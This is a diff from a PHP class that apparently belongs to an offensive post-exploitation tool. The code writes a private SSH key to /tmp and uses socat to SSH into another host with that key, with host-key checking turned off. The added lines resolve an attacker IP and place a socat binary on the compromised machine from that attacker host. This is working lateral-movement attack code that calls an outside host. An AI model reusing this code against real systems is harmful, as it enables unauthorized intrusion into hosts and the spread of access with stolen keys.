@@ -311,8 +311,11 @@ class check4linux8key extends check4linux8enum{
 
         $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
         
+        $ip_attacker = $this->ip4addr4target($this->ip);
+        $filename = "socat";
+        $path_remotebin_socat = $this->bin2path($this->stream,$filename,$ip_attacker);
         
-        $query = "(sleep 3;echo '\\n';sleep 3;echo '\\n';sleep 3;echo '\\n';)  | socat - EXEC:\"ssh -i /tmp/$hash.priv $username@$host -p $ssh_port -C 'id' -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null\",pty,stderr,setsid,sigint,ctty,sane  ";
+        $query = "(sleep 3;echo '\\n';sleep 3;echo '\\n';sleep 3;echo '\\n';)  | $path_remotebin_socat - EXEC:\"ssh -i /tmp/$hash.priv $username@$host -p $ssh_port -C 'id' -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null\",pty,stderr,setsid,sigint,ctty,sane  ";
         $rst_id = $this->req_str($stream, $query, $this->stream_timeout, "");
         while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE || strstr($rst_id, "Permission denied, please try again.")!==FALSE){
             $chaine = "Asking Password";
